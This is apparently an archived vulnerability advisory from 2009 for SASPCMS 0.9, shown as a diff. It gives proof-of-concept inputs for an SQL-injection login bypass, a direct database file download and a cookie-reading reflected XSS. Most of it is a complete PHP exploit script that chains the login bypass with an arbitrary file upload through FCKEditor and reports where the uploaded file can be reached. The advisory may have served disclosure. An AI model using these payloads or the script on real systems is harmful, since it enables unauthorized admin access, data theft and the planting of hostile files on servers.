@@ -1,0 +1,217 @@
+##########################www.BugReport.ir########################################
+#
+#        AmnPardaz Security Research Team
+#
+# Title:        SASPCMS Multiple Vulnerabilities
+# Vendor:        http://www.lgasoft.com
+# Vulnerable Version:    0.9 (prior versions also may be affected)
+# Exploitation:        Remote with browser
+# Fix:            N/A
+###################################################################################
+
+####################
+- Description:
+####################
+
+SASPCMS is an ASP Content Management System . SASPCMS witch uses MSSQL & Microsoft Access as backend database.
+
+####################
+- Vulnerability:
+####################
+
++-->Authentication Bypass
+
+POC: ' or ''='
+http://[URL]/saspcms/admin/default.asp
+
+
++-->Database Information Disclosure
+
+POC: http://[URL]/saspcms/db/menu.mdb
+
+
++-->Cross Site Scripting (XSS). Reflected XSS attack in "default.asp" in "q" parameter.
+
+POC: http://[URL]/saspcms/default.asp?q=<script>alert(document.cookie)</script>
+
+
+
+####################
+- PoC:
+####################
+
+It's possible for remote attackers to upload arbitrary files by using FCKEditor after login to admin area.
+
+<?php
+########################## WwW.BugReport.ir ######################################
+#
+#      AmnPardaz Security Research & Penetration Testing Group
+#
+# Title: SASPCMS Remote File Upload
+# Original Advisory: http://www.bugreport.ir/index_64.htm
+##################################################################################
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout", 5);
+ob_implicit_flush (1);
+
+echo'<html>
+<head>
+<title>SASPCMS Remote File Upload</title>
+</head>
+
+<body bgcolor="#00000">
+
+<p align="center"><font size="4" color="white">SASPCMS Remote File Upload</font></p>
+</font>
+<table width="90%">
+  <tbody>
+    <tr>
+      <td width="43%" align="left">
+        <form name="form1" action="'.$SERVER[PHP_SELF].'" enctype="multipart/form-data"  method="post">
+          <p></font><font color="white" > hostname (ex:www.sitename.com):&nbsp;&nbsp;&nbsp;&nbsp</font><input name="host" size="20"> <span class="Stile5"><font color="#FF0000">*</span></p>
+          <p></font><font color="white" > path (ex: /saspcms/ or just / ):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp</font><input name="path" size="20"> <span class="Stile5"><font color="#FF0000">*</span></p>
+          <p></font><font color="white" >Please specify a file to upload: &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp</font><input type="file" name="datafile" size="40"><font color="#FF0000"> * </font>
+          <p><font color="white" >  specify a port&nbsp;(default is 80):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp </font><input name="port" size="20"><span class="Stile5"></span></p>
+          <p><font color="white" >  Proxy (ip:port):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp</font><input name="proxy" size="20"><span class="Stile5"></span></p>
+          <p align="center"> <span class="Stile5"><font color="#FF0000">* </font><font color="white" >fields are required</font></font></span></p>
+          <p><input type="submit" value="Start" name="Submit"></p>
+        </form>
+      </td>
+    </tr>
+  </tbody>
+</table>
+</body></html>';
+
+function sendpacket($packet,$response = 0,$output = 0)
+{
+    $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+    global $proxy, $host, $port, $html;
+    if ($proxy == '')
+    {
+        $ock = fsockopen($host,$port);
+        if (!$ock)
+        {
+            $off = 1;
+            echo '<font color=white> No response from '.htmlentities($host).' ...<br></font>';
+            die;
+        }
+    } else
+    {
+        $parts = explode(':',$proxy);
+        echo '<font color=white>Connecting to '.$parts[0].':'.$parts[1].' proxy...<br></font>';
+        $ock   = fsockopen($parts[0],$parts[1]);
+        if (!$ock)
+        {
+            echo '<font color=white>No response from proxy...<br></font>';
+            die;
+        }
+    }
+    if($off == 1)
+    {}else
+    {
+        fputs($ock,$packet);
+        if ($response == 1)
+        {
+            if ($proxy == '')
+            {
+                $html = '';
+                while (!feof($ock))
+                {
+                    $html .= fgets($ock);
+                }
+            } else
+            {
+                $html = '';
+                while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
+                {
+                    $html .= fread($ock,1);
+                }
+            }
+        } else $html = '';
+        fclose($ock);
+        if ($response == 1 && $output == 1) echo nl2br(htmlentities($html));
+    }
+}
+
+  $host   = $_POST['host'];
+  $path   = $_POST['path'];
+  $port   = $_POST['port'];
+
+if (isset($_POST['Submit']) && $host != '' && $path != '')
+{
+
+  $port=intval(trim($port));
+  if ($port=='') {$port=80;}
+  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {die('<font color=white>Error... check the path!</font>');}
+  if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+  $host=str_replace("\r\n","",$host);
+  $path=str_replace("\r\n","",$path);
+
+  // login to the admin area
+  $query   = "SAspCms=%27+or+%27%27%3D%27";
+  $packet  = "POST ".$p."admin/admin.asp HTTP/1.1\r\n";
+  $packet .= "Host: ".$host."\r\n";
+  $packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+  $packet .= "Cache-Control: no-cache\r\n";
+  $packet .= "Content-Length: ".strlen($query)."\r\n";
+  $packet .= "Connection: Close\r\n\r\n";
+  $packet .= $query;
+
+  sendpacket($packet,1,0);
+  if(stristr($html , 'Set-Cookie: ASPSESSIONID') == true)
+  {
+      $pattern      = "(ASPSESSIONID[A-Z]{8}=[A-Z]{24})";
+      $cookie_name  = (preg_match($pattern, $html, $matches)) ? $matches[0] : '';
+  }
+
+  // Upload File
+  $content = file_get_contents($_FILES['datafile']['tmp_name']);
+  $name    = rand().$_FILES['datafile']['name'];
+  $type    = $_FILES['datafile']['type'];
+  $data    = "-----------------------------7d51143b10418\r\n";
+  $data   .= "Content-Disposition: form-data; name=\"file\"; filename=\"$name\"\r\n";
+  $data   .= "Content-Type: ".$type."\r\n\r\n";
+  $data   .= "$content\r\n";
+  $data   .= "-----------------------------7d51143b10418--";
+  $packet  = "POST ".$p."wexlite/default.asp?precommand=ProcessUpload&folder=userfiles%5C&popup=true HTTP/1.1\r\n";
+  $packet .= "Content-Type: multipart/form-data; boundary=---------------------------7d51143b10418\r\n";
+  $packet .= "User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\r\n";
+  $packet .= "Host: ".$host."\r\n";
+  $packet .= "Cookie: $cookie_name\r\n";
+  $packet .= "Cache-Control: no-cache\r\n";
+  $packet .= "Content-Length: ".strlen($data)."\r\n";
+  $packet .= "Connection: Close\r\n\r\n";
+  $packet .= $data;
+  sendpacket($packet,1,0);
+
+  $packet  = "GET ".$p."userfiles/$name HTTP/1.1\r\n";
+  $packet .= "Host: ".$host."\r\n";
+  $packet .= "User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\r\n";
+  $packet .= "Cache-Control: no-cache\r\n";
+  $packet .= "Connection: Close\r\n\r\n";
+  sendpacket($packet,1,0);
+
+  if(stristr($html , '200 OK') != true)
+  {echo "<font color=white>Exploit Faild...</font>";} else echo "<font color=white>Exploit Succeeded...<br>http://$host:$port$path"."userfiles/$name</font>";
+}
+?>
+
+
+####################
+- Solution:
+####################
+
+Edit the source code to ensure that inputs are properly sanitized.
+
+
+####################
+- Credit:
+####################
+AmnPardaz Security Research & Penetration Testing Group
+Contact: admin[4t}bugreport{d0t]ir
+www.BugReport.ir
+www.AmnPardaz.com 
+
+# milw0rm.com [2009-04-08]
